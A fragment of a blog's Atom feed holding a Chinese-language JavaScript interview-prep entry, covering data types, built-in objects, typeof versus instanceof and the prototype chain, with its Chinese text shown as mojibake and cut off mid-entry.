    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯æˆ‘åœ¨å¤ä¹ Vueï¼Œå‡†å¤‡å®ä¹ é¢è¯•æ—¶æ•´ç†çš„ç¬”è®°ï¼Œå‚è€ƒè‡ªä¸€äº›å·²ç»æ•´ç†å¥½çš„åšå®¢ï¼š&lt;a href=&quot;https://github.com/Cavs</summary>
      
    
    
    
    <category term="é¢è¯•å‡†å¤‡" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="Vue" scheme="http://example.com/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>ã€é¢è¯•å‡†å¤‡ã€‘â€” â€” JavaScriptç¯‡</title>
    <link href="http://example.com/2021/07/03/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20JavaScript%E7%AF%87/"/>
    <id>http://example.com/2021/07/03/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20JavaScript%E7%AF%87/</id>
    <published>2021-07-03T19:26:44.000Z</published>
    <updated>2021-09-16T12:56:35.284Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯æˆ‘åœ¨å¤ä¹ JavaScriptï¼Œå‡†å¤‡å®ä¹ é¢è¯•æ—¶æ•´ç†çš„ç¬”è®°ï¼Œä¸»è¦å‚è€ƒè‡ªå‘¨æ¸¸å­¦é•¿çš„åšå®¢ï¼š<a href="https://github.com/CavsZhouyou/Front-End-Interview-Notebook/blob/master/JavaScript/JavaScript.md">JavaScript é¢è¯•çŸ¥è¯†ç‚¹æ€»ç»“</a>ï¼Œå…¶ä»–æ¶‰åŠåˆ°çš„ä¼˜è´¨åšå®¢ä¹Ÿå·²é™„ä¸Šé“¾æ¥ï¼Œä¾µæƒåˆ ã€‚</p><h1 id="JavaScript-åŸºç¡€çŸ¥è¯†"><a href="#JavaScript-åŸºç¡€çŸ¥è¯†" class="headerlink" title="JavaScript åŸºç¡€çŸ¥è¯†"></a>JavaScript åŸºç¡€çŸ¥è¯†</h1><h2 id="js-ä¸­çš„å‘½åè§„åˆ™"><a href="#js-ä¸­çš„å‘½åè§„åˆ™" class="headerlink" title="js ä¸­çš„å‘½åè§„åˆ™"></a>js ä¸­çš„å‘½åè§„åˆ™</h2><p>ï¼ˆ1ï¼‰ç¬¬ä¸€ä¸ªå­—ç¬¦å¿…é¡»æ˜¯å­—æ¯ã€ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰æˆ–ç¾å…ƒç¬¦å·ï¼ˆ$ï¼‰<br>ï¼ˆ2ï¼‰ä½™ä¸‹çš„å­—ç¬¦å¯ä»¥æ˜¯ä¸‹åˆ’çº¿ã€ç¾å…ƒç¬¦å·æˆ–ä»»ä½•å­—æ¯æˆ–æ•°å­—å­—ç¬¦</p><p>ä¸€èˆ¬æˆ‘ä»¬æ¨èä½¿ç”¨é©¼å³°æ³•æ¥å¯¹å˜é‡åè¿›è¡Œå‘½åï¼Œå› ä¸ºè¿™æ ·å¯ä»¥ä¸ ECMAScript å†…ç½®çš„å‡½æ•°å’Œå¯¹è±¡å‘½åæ ¼å¼ä¿æŒä¸€è‡´ã€‚</p><h2 id="js-çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Ÿ"><a href="#js-çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Ÿ" class="headerlink" title="js çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Ÿ"></a>js çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Ÿ</h2><p>js ä¸€å…±æœ‰å…­ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼Œåˆ†åˆ«æ˜¯ Undefinedã€Nullã€Booleanã€Numberã€Stringï¼Œè¿˜æœ‰åœ¨ ES6 ä¸­æ–°å¢çš„ Symbol å’Œ ES10 ä¸­æ–°å¢çš„ BigInt ç±»å‹ã€‚<br>Symbol ä»£è¡¨åˆ›å»ºåç‹¬ä¸€æ— äºŒä¸”ä¸å¯å˜çš„æ•°æ®ç±»å‹ï¼Œä¸»è¦æ˜¯ä¸ºäº†è§£å†³å¯èƒ½å‡ºç°çš„å…¨å±€å˜é‡å†²çªçš„é—®é¢˜ã€‚<br>BigInt æ˜¯ä¸€ç§æ•°å­—ç±»å‹çš„æ•°æ®ï¼Œå®ƒå¯ä»¥è¡¨ç¤ºä»»æ„ç²¾åº¦æ ¼å¼çš„æ•´æ•°ï¼Œä½¿ç”¨ BigInt å¯ä»¥å®‰å…¨åœ°å­˜å‚¨å’Œæ“ä½œå¤§æ•´æ•°ï¼Œå³ä½¿è¿™ä¸ªæ•°å·²ç»è¶…å‡ºäº† Number èƒ½å¤Ÿè¡¨ç¤ºçš„å®‰å…¨æ•´æ•°èŒƒå›´ã€‚</p><h2 id="JavaScript-æœ‰å‡ ç§ç±»å‹çš„å€¼ï¼Ÿ"><a href="#JavaScript-æœ‰å‡ ç§ç±»å‹çš„å€¼ï¼Ÿ" class="headerlink" title="JavaScript æœ‰å‡ ç§ç±»å‹çš„å€¼ï¼Ÿ"></a>JavaScript æœ‰å‡ ç§ç±»å‹çš„å€¼ï¼Ÿ</h2><ul><li>æ ˆï¼šåŸå§‹æ•°æ®ç±»å‹ï¼ˆUndefinedã€Nullã€Booleanã€Numberã€Stringï¼‰</li><li>å †ï¼šå¼•ç”¨æ•°æ®ç±»å‹ï¼ˆå¯¹è±¡ã€æ•°ç»„å’Œå‡½æ•°ï¼‰</li></ul><p>ä¸¤ç§ç±»å‹çš„åŒºåˆ«æ˜¯ï¼šå­˜å‚¨ä½ç½®ä¸åŒã€‚</p><ul><li>åŸå§‹æ•°æ®ç±»å‹ç›´æ¥å­˜å‚¨åœ¨æ ˆï¼ˆstackï¼‰ä¸­çš„ç®€å•æ•°æ®æ®µï¼Œå æ®ç©ºé—´å°ã€å¤§å°å›ºå®šï¼Œå±äºè¢«é¢‘ç¹ä½¿ç”¨æ•°æ®ã€‚</li><li>å¼•ç”¨æ•°æ®ç±»å‹å­˜å‚¨åœ¨å †ï¼ˆheapï¼‰ä¸­çš„å¯¹è±¡ï¼Œå æ®ç©ºé—´å¤§ã€å¤§å°ä¸å›ºå®šã€‚å¦‚æœå­˜å‚¨åœ¨æ ˆä¸­ï¼Œå°†ä¼šå½±å“ç¨‹åºè¿è¡Œçš„æ€§èƒ½ï¼›å¼•ç”¨æ•°æ®ç±»å‹åœ¨<strong>æ ˆä¸­å­˜å‚¨äº†æŒ‡é’ˆ</strong>ï¼ŒæŒ‡å‘å †ä¸­è¯¥å®ä½“çš„èµ·å§‹åœ°å€ã€‚å½“è§£é‡Šå™¨å¯»æ‰¾å¼•ç”¨å€¼æ—¶ï¼Œä¼šé¦–å…ˆæ£€ç´¢å…¶åœ¨æ ˆä¸­çš„åœ°å€ï¼Œç„¶åä»å †ä¸­è·å¾—å®ä½“ã€‚</li></ul><p><img src="https://i.loli.net/2021/07/04/ypQAzYnGjm2FeuK.jpg" alt="Snipaste_2021-07-04_19-37-40.jpg"></p><h2 id="å†…éƒ¨å±æ€§-Class-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å†…éƒ¨å±æ€§-Class-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å†…éƒ¨å±æ€§ [[Class]] æ˜¯ä»€ä¹ˆï¼Ÿ"></a>å†…éƒ¨å±æ€§ [[Class]] æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>æ‰€æœ‰ typeof è¿”å›å€¼ä¸º â€œobjectâ€ çš„å¯¹è±¡ï¼ˆå¦‚æ•°ç»„ï¼‰éƒ½åŒ…å«ä¸€ä¸ªå†…éƒ¨å±æ€§ [[Class]]ï¼ˆæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹ä½œä¸€ä¸ªå†…éƒ¨çš„åˆ†ç±»ï¼Œè€Œéä¼ ç»Ÿçš„é¢å‘å¯¹è±¡æ„ä¹‰ä¸Šçš„ç±»ï¼‰ã€‚è¿™ä¸ªå±æ€§æ— æ³•ç›´æ¥è®¿é—®ï¼Œä¸€èˆ¬é€šè¿‡ <code>Object.prototype.toString(..)</code> æ¥æŸ¥çœ‹ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call( [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] );</span><br><span class="line"><span class="comment">// &quot;[object Array]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call( <span class="regexp">/regex-literal/i</span> );</span><br><span class="line"><span class="comment">// &quot;[object RegExp]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ç±»å°±ä¸ä¼šæœ‰è¿™ä»½ç‰¹æ®Šå¾…é‡ï¼Œå› ä¸º toString() æ‰¾ä¸åˆ° toStringTag å±æ€§æ—¶åªå¥½è¿”å›é»˜è®¤çš„ Object æ ‡ç­¾</span></span><br><span class="line"><span class="comment">// é»˜è®¤æƒ…å†µç±»çš„[[Class]]è¿”å›[object Object]</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class1</span> </span>&#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> Class1()); <span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"><span class="comment">// éœ€è¦å®šåˆ¶[[Class]]</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class2</span> </span>&#123;</span><br><span class="line">  get [<span class="built_in">Symbol</span>.toStringTag]() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Class2&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> Class2()); <span class="comment">// &quot;[object Class2]&quot;</span></span><br></pre></td></tr></table></figure><h2 id="js-æœ‰å“ªäº›å†…ç½®å¯¹è±¡ï¼Ÿ"><a href="#js-æœ‰å“ªäº›å†…ç½®å¯¹è±¡ï¼Ÿ" class="headerlink" title="js æœ‰å“ªäº›å†…ç½®å¯¹è±¡ï¼Ÿ"></a>js æœ‰å“ªäº›å†…ç½®å¯¹è±¡ï¼Ÿ</h2><p>å…¨å±€çš„å¯¹è±¡ï¼ˆ global objects ï¼‰æˆ–ç§°æ ‡å‡†å†…ç½®å¯¹è±¡ï¼Œä¸è¦å’Œ â€œå…¨å±€å¯¹è±¡ï¼ˆglobal objectï¼‰â€ æ··æ·†ã€‚è¿™é‡Œè¯´çš„<strong>å…¨å±€çš„å¯¹è±¡æ˜¯è¯´åœ¨å…¨å±€ä½œç”¨åŸŸé‡Œçš„å¯¹è±¡</strong>ã€‚å…¨å±€ä½œç”¨åŸŸä¸­çš„å…¶ä»–å¯¹è±¡å¯ä»¥ç”±ç”¨æˆ·çš„è„šæœ¬åˆ›å»ºæˆ–ç”±å®¿ä¸»ç¨‹åºæä¾›ã€‚</p><p>æ ‡å‡†å†…ç½®å¯¹è±¡çš„åˆ†ç±»</p><p>ï¼ˆ1ï¼‰<strong>å€¼å±æ€§</strong>ï¼Œè¿™äº›å…¨å±€å±æ€§è¿”å›ä¸€ä¸ªç®€å•å€¼ï¼Œè¿™äº›å€¼æ²¡æœ‰è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•ã€‚ä¾‹å¦‚ Infinityã€NaNã€undefinedã€null å­—é¢é‡</p><p>ï¼ˆ2ï¼‰<strong>å‡½æ•°å±æ€§</strong>ï¼Œå…¨å±€å‡½æ•°å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä¸éœ€è¦åœ¨è°ƒç”¨æ—¶æŒ‡å®šæ‰€å±å¯¹è±¡ï¼Œæ‰§è¡Œç»“æŸåä¼šå°†ç»“æœç›´æ¥è¿”å›ç»™è°ƒç”¨è€…ã€‚ä¾‹å¦‚ eval()ã€parseFloat()ã€parseInt() ç­‰</p><p>ï¼ˆ3ï¼‰<strong>åŸºæœ¬å¯¹è±¡</strong>ï¼ŒåŸºæœ¬å¯¹è±¡æ˜¯å®šä¹‰æˆ–ä½¿ç”¨å…¶ä»–å¯¹è±¡çš„åŸºç¡€ã€‚åŸºæœ¬å¯¹è±¡åŒ…æ‹¬ä¸€èˆ¬å¯¹è±¡ã€å‡½æ•°å¯¹è±¡å’Œé”™è¯¯å¯¹è±¡ã€‚ä¾‹å¦‚ Objectã€Functionã€Booleanã€Symbolã€Error ç­‰</p><p>ï¼ˆ4ï¼‰<strong>æ•°å­—å’Œæ—¥æœŸå¯¹è±¡</strong>ï¼Œç”¨æ¥è¡¨ç¤ºæ•°å­—ã€æ—¥æœŸå’Œæ‰§è¡Œæ•°å­¦è®¡ç®—çš„å¯¹è±¡ã€‚ä¾‹å¦‚ Numberã€Mathã€Date</p><p>ï¼ˆ5ï¼‰<strong>å­—ç¬¦ä¸²</strong>ï¼Œç”¨æ¥è¡¨ç¤ºå’Œæ“ä½œå­—ç¬¦ä¸²çš„å¯¹è±¡ã€‚ä¾‹å¦‚ Stringã€RegExp</p><p>ï¼ˆ6ï¼‰<strong>å¯ç´¢å¼•çš„é›†åˆå¯¹è±¡</strong>ï¼Œè¿™äº›å¯¹è±¡è¡¨ç¤ºæŒ‰ç…§ç´¢å¼•å€¼æ¥æ’åºçš„æ•°æ®é›†åˆï¼ŒåŒ…æ‹¬æ•°ç»„å’Œç±»å‹æ•°ç»„ï¼Œä»¥åŠç±»æ•°ç»„ç»“æ„çš„å¯¹è±¡ã€‚ä¾‹å¦‚ Array</p><p>ï¼ˆ7ï¼‰<strong>ä½¿ç”¨é”®çš„é›†åˆå¯¹è±¡</strong>ï¼Œè¿™äº›é›†åˆå¯¹è±¡åœ¨å­˜å‚¨æ•°æ®æ—¶ä¼šä½¿ç”¨åˆ°é”®ï¼Œæ”¯æŒæŒ‰ç…§æ’å…¥é¡ºåºæ¥è¿­ä»£å…ƒç´ ã€‚ä¾‹å¦‚ Mapã€Setã€WeakMapã€WeakSet</p><p>ï¼ˆ8ï¼‰<strong>çŸ¢é‡é›†åˆ</strong>ï¼ŒSIMD çŸ¢é‡é›†åˆä¸­çš„æ•°æ®ä¼šè¢«ç»„ç»‡ä¸ºä¸€ä¸ªæ•°æ®åºåˆ—ã€‚ä¾‹å¦‚ SIMD ç­‰</p><p>ï¼ˆ9ï¼‰<strong>ç»“æ„åŒ–æ•°æ®</strong>ï¼Œè¿™äº›å¯¹è±¡ç”¨æ¥è¡¨ç¤ºå’Œæ“ä½œç»“æ„åŒ–çš„ç¼“å†²åŒºæ•°æ®ï¼Œæˆ–ä½¿ç”¨ JSON ç¼–ç çš„æ•°æ®ã€‚ä¾‹å¦‚ JSON ç­‰</p><p>ï¼ˆ10ï¼‰<strong>æ§åˆ¶æŠ½è±¡å¯¹è±¡</strong>ã€‚ä¾‹å¦‚ Promiseã€Generator ç­‰</p><p>ï¼ˆ11ï¼‰<strong>åå°„</strong>ã€‚ä¾‹å¦‚ Reflectã€Proxy</p><p>ï¼ˆ12ï¼‰å›½é™…åŒ–ï¼Œä¸ºäº†æ”¯æŒå¤šè¯­è¨€å¤„ç†è€ŒåŠ å…¥ ECMAScript çš„å¯¹è±¡ã€‚ä¾‹å¦‚ Intlã€Intl.Collator ç­‰</p><p>ï¼ˆ13ï¼‰WebAssembly</p><p>ï¼ˆ14ï¼‰å…¶ä»–ä¾‹å¦‚ arguments</p><h2 id="undefined-ä¸-undeclared-çš„åŒºåˆ«ï¼Ÿ"><a href="#undefined-ä¸-undeclared-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="undefined ä¸ undeclared çš„åŒºåˆ«ï¼Ÿ"></a>undefined ä¸ undeclared çš„åŒºåˆ«ï¼Ÿ</h2><p>å·²åœ¨ä½œç”¨åŸŸä¸­å£°æ˜ä½†è¿˜æ²¡æœ‰èµ‹å€¼çš„å˜é‡ï¼Œæ˜¯ undefined çš„ã€‚ç›¸åï¼Œè¿˜æ²¡æœ‰åœ¨ä½œç”¨åŸŸä¸­å£°æ˜è¿‡çš„å˜é‡ï¼Œæ˜¯ undeclared çš„ã€‚</p><p>å¯¹äº undeclared å˜é‡çš„å¼•ç”¨ï¼Œæµè§ˆå™¨ä¼šæŠ¥å¼•ç”¨é”™è¯¯ï¼Œå¦‚ ReferenceError: b is not defined ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ typeof çš„å®‰å…¨é˜²èŒƒæœºåˆ¶æ¥é¿å…æŠ¥é”™ï¼Œå› ä¸ºå¯¹äº undeclaredï¼ˆæˆ–è€… not defined ï¼‰å˜é‡ï¼Œtypeof ä¼šè¿”å› â€œundefinedâ€ã€‚</p><h2 id="null-å’Œ-undefined-çš„åŒºåˆ«ï¼Ÿ"><a href="#null-å’Œ-undefined-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="null å’Œ undefined çš„åŒºåˆ«ï¼Ÿ"></a>null å’Œ undefined çš„åŒºåˆ«ï¼Ÿ</h2><p>é¦–å…ˆ Undefined å’Œ Null éƒ½æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œè¿™ä¸¤ä¸ªåŸºæœ¬æ•°æ®ç±»å‹åˆ†åˆ«éƒ½åªæœ‰ä¸€ä¸ªå€¼ï¼Œå°±æ˜¯ undefined å’Œ nullã€‚</p><p>undefined ä»£è¡¨çš„å«ä¹‰æ˜¯æœªå®šä¹‰ï¼Œnull ä»£è¡¨çš„å«ä¹‰æ˜¯ç©ºå¯¹è±¡ã€‚ä¸€èˆ¬å˜é‡å£°æ˜äº†ä½†è¿˜æ²¡æœ‰å®šä¹‰çš„æ—¶å€™ä¼šè¿”å› undefinedï¼Œnull ä¸»è¦ç”¨äºèµ‹å€¼ç»™ä¸€äº›å¯èƒ½ä¼šè¿”å›å¯¹è±¡çš„å˜é‡ï¼Œä½œä¸ºåˆå§‹åŒ–ã€‚</p><p>undefined åœ¨ js ä¸­ä¸æ˜¯ä¸€ä¸ªä¿ç•™å­—ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ undefined æ¥ä½œä¸ºä¸€ä¸ªå˜é‡åï¼Œè¿™æ ·çš„åšæ³•æ˜¯éå¸¸å±é™©çš„ï¼Œå®ƒä¼šå½±å“æˆ‘ä»¬å¯¹ undefined å€¼çš„åˆ¤æ–­ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹æ³•è·å¾—å®‰å…¨çš„ undefined å€¼ï¼Œæ¯”å¦‚è¯´ void 0ã€‚</p><p>å½“æˆ‘ä»¬å¯¹ä¸¤ç§ç±»å‹ä½¿ç”¨ typeof è¿›è¡Œåˆ¤æ–­çš„æ—¶å€™ï¼ŒNull ç±»å‹åŒ–ä¼šè¿”å› â€œobjectâ€ï¼Œè¿™æ˜¯ä¸€ä¸ªå†å²é—ç•™çš„é—®é¢˜ã€‚å½“æˆ‘ä»¬ä½¿ç”¨åŒç­‰å·å¯¹ä¸¤ç§ç±»å‹çš„å€¼è¿›è¡Œæ¯”è¾ƒæ—¶ä¼šè¿”å› trueï¼Œä½¿ç”¨ä¸‰ä¸ªç­‰å·æ—¶ä¼šè¿”å› falseã€‚</p><h2 id="for-of-å’Œ-for-in-çš„åŒºåˆ«ï¼Ÿ"><a href="#for-of-å’Œ-for-in-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="for of å’Œ for in çš„åŒºåˆ«ï¼Ÿ"></a>for of å’Œ for in çš„åŒºåˆ«ï¼Ÿ</h2><ul><li>for in ï¼šéå†æ–¹æ³•ï¼Œå¯éå†å¯¹è±¡å’Œæ•°ç»„</li><li>for of ï¼šéå†æ–¹æ³•ï¼Œåªèƒ½éå†æ•°ç»„ï¼Œä¸èƒ½éå†éiterableå¯¹è±¡</li></ul><h2 id="typeof-å’Œ-instanceof-çš„åŒºåˆ«ï¼Ÿ"><a href="#typeof-å’Œ-instanceof-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="typeof å’Œ instanceof çš„åŒºåˆ«ï¼Ÿ"></a>typeof å’Œ instanceof çš„åŒºåˆ«ï¼Ÿ</h2><p><code>typeof</code> å¯¹äºåŸå§‹ç±»å‹æ¥è¯´ï¼Œé™¤äº† <code>null</code> éƒ½å¯ä»¥æ˜¾ç¤ºæ­£ç¡®çš„ç±»å‹ï¼Œå¯¹äºå¯¹è±¡æ¥è¯´ï¼Œé™¤äº†å‡½æ•°éƒ½ä¼šæ˜¾ç¤º <code>object</code>ï¼Œæ‰€ä»¥è¯´ <code>typeof</code> <strong>å¹¶ä¸èƒ½å‡†ç¡®åˆ¤æ–­å˜é‡åˆ°åº•æ˜¯ä»€ä¹ˆç±»å‹</strong>ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="number">1</span> <span class="comment">// &#x27;number&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">&#x27;1&#x27;</span> <span class="comment">// &#x27;string&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span> <span class="comment">// &#x27;undefined&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span> <span class="comment">// &#x27;boolean&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Symbol</span>() <span class="comment">// &#x27;symbol&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> [] <span class="comment">// &#x27;object&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;&#125; <span class="comment">// &#x27;object&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">console</span>.log <span class="comment">// &#x27;function&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æƒ³åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡çš„æ­£ç¡®ç±»å‹ï¼Œå°±å¯ä»¥è€ƒè™‘ä½¿ç”¨ <code>instanceof</code>ï¼Œå› ä¸ºå†…éƒ¨æœºåˆ¶æ˜¯é€šè¿‡åŸå‹é“¾æ¥åˆ¤æ–­çš„ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Person = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> Person()</span><br><span class="line">p1 <span class="keyword">instanceof</span> Person <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">str <span class="keyword">instanceof</span> <span class="built_in">String</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str1 = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">str1 <span class="keyword">instanceof</span> <span class="built_in">String</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•è·å–å®‰å…¨çš„-undefined-å€¼ï¼Ÿ"><a href="#å¦‚ä½•è·å–å®‰å…¨çš„-undefined-å€¼ï¼Ÿ" class="headerlink" title="å¦‚ä½•è·å–å®‰å…¨çš„ undefined å€¼ï¼Ÿ"></a>å¦‚ä½•è·å–å®‰å…¨çš„ undefined å€¼ï¼Ÿ</h2><p>å› ä¸º undefined æ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥è¢«å½“ä½œå˜é‡æ¥ä½¿ç”¨å’Œèµ‹å€¼ï¼Œä½†æ˜¯è¿™æ ·ä¼šå½±å“ undefined çš„æ­£å¸¸åˆ¤æ–­ã€‚</p><p>è¡¨è¾¾å¼ void ___ æ²¡æœ‰è¿”å›å€¼ï¼Œå› æ­¤è¿”å›ç»“æœæ˜¯ undefinedã€‚void å¹¶ä¸æ”¹å˜è¡¨è¾¾å¼çš„ç»“æœï¼Œåªæ˜¯è®©è¡¨è¾¾å¼ä¸è¿”å›å€¼ã€‚</p><p>æŒ‰æƒ¯ä¾‹æˆ‘ä»¬ç”¨ void 0 æ¥è·å¾— undefinedã€‚</p><h2 id="è¯´å‡ æ¡å†™-JavaScript-çš„åŸºæœ¬è§„èŒƒï¼Ÿ"><a href="#è¯´å‡ æ¡å†™-JavaScript-çš„åŸºæœ¬è§„èŒƒï¼Ÿ" class="headerlink" title="è¯´å‡ æ¡å†™ JavaScript çš„åŸºæœ¬è§„èŒƒï¼Ÿ"></a>è¯´å‡ æ¡å†™ JavaScript çš„åŸºæœ¬è§„èŒƒï¼Ÿ</h2><p>ï¼ˆ1ï¼‰ä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸä¸­æ‰€æœ‰çš„å˜é‡å£°æ˜åº”è¯¥å°½é‡æåˆ°å‡½æ•°é¦–éƒ¨ï¼Œç”¨ä¸€ä¸ª var å£°æ˜ï¼Œ<strong>ä¸å…è®¸å‡ºç°ä¸¤ä¸ªè¿ç»­çš„ var å£°æ˜</strong>ã€‚å£°æ˜æ—¶ï¼Œå¦‚æœå˜é‡æ²¡æœ‰å€¼ï¼Œåº”è¯¥ç»™è¯¥å˜é‡èµ‹å€¼å¯¹åº”ç±»å‹çš„<strong>åˆå§‹å€¼</strong>ï¼Œä¾¿äºä»–äººé˜…è¯»ä»£ç æ—¶ï¼Œèƒ½å¤Ÿä¸€ç›®äº†ç„¶çš„çŸ¥é“å˜é‡å¯¹åº”çš„ç±»å‹å€¼ã€‚</p><p>ï¼ˆ2ï¼‰ä»£ç ä¸­å‡ºç°åœ°å€ã€æ—¶é—´ç­‰å­—ç¬¦ä¸²æ—¶éœ€è¦ä½¿ç”¨<strong>å¸¸é‡ä»£æ›¿</strong>ã€‚</p><p>ï¼ˆ3ï¼‰åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™å§ï¼Œå°½é‡ä½¿ç”¨**â€™===â€™, â€˜!==â€™ä»£æ›¿â€™==â€™, â€˜!=â€™**ã€‚</p><p>ï¼ˆ4ï¼‰<strong>ä¸è¦åœ¨å†…ç½®å¯¹è±¡çš„åŸå‹ä¸Šæ·»åŠ æ–¹æ³•</strong>ï¼Œå¦‚ Array, Dateã€‚</p><p>ï¼ˆ5ï¼‰switch è¯­å¥å¿…é¡»å¸¦æœ‰ <strong>default åˆ†æ”¯</strong>ã€‚</p><p>ï¼ˆ6ï¼‰for å¾ªç¯å¿…é¡»ä½¿ç”¨<strong>å¤§æ‹¬å·</strong>ã€‚</p><p>ï¼ˆ7ï¼‰if è¯­å¥å¿…é¡»ä½¿ç”¨<strong>å¤§æ‹¬å·</strong>ã€‚</p><h2 id="JavaScript-åŸå‹ï¼ŒåŸå‹é“¾ï¼Ÿï¼ˆé«˜é¢‘ï¼‰"><a href="#JavaScript-åŸå‹ï¼ŒåŸå‹é“¾ï¼Ÿï¼ˆé«˜é¢‘ï¼‰" class="headerlink" title="JavaScript åŸå‹ï¼ŒåŸå‹é“¾ï¼Ÿï¼ˆé«˜é¢‘ï¼‰"></a>JavaScript åŸå‹ï¼ŒåŸå‹é“¾ï¼Ÿï¼ˆé«˜é¢‘ï¼‰</h2><p>å¯ä»¥ç»å¸¸å›é¡¾ <a href="https://juejin.cn/post/6844903749345886216">æ·±å…¥JavaScriptç³»åˆ—ï¼ˆå…­ï¼‰ï¼šåŸå‹ä¸åŸå‹é“¾</a>ã€‚</p><p>åœ¨ js ä¸­æˆ‘ä»¬æ˜¯ä½¿ç”¨æ„é€ å‡½æ•°æ¥æ–°å»ºä¸€ä¸ªå¯¹è±¡çš„ï¼Œæ¯ä¸€ä¸ªæ„é€ å‡½æ•°çš„å†…éƒ¨éƒ½æœ‰ä¸€ä¸ª prototype å±æ€§å€¼ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«äº†å¯ä»¥ç”±è¯¥æ„é€ å‡½æ•°çš„æ‰€æœ‰å®ä¾‹å…±äº«çš„å±æ€§å’Œæ–¹æ³•ã€‚<strong>åŸå‹:</strong> å¯¹è±¡ä¸­å›ºæœ‰çš„__proto__å±æ€§ï¼Œè¯¥å±æ€§æŒ‡å‘å¯¹è±¡çš„ prototype åŸå‹å±æ€§ã€‚</p><p><strong>è·å–å¯¹è±¡çš„åŸå‹æœ‰ä¸‰ç§æ–¹æ³•ï¼š</strong></p><ul><li><code>p.__proto__</code></li><li><code>p.constructor.prototype</code></li><li><code>Object.getPrototypeOf(p)</code></li></ul><p><strong>åŸå‹é“¾</strong>ï¼šå½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œå¦‚æœè¿™ä¸ªå¯¹è±¡å†…éƒ¨ä¸å­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šå»å®ƒçš„åŸå‹å¯¹è±¡é‡Œæ‰¾è¿™ä¸ªå±æ€§ï¼Œè¿™ä¸ªåŸå‹å¯¹è±¡åˆä¼šæœ‰è‡ªå·±çš„åŸå‹ï¼Œäºæ˜¯å°±è¿™æ 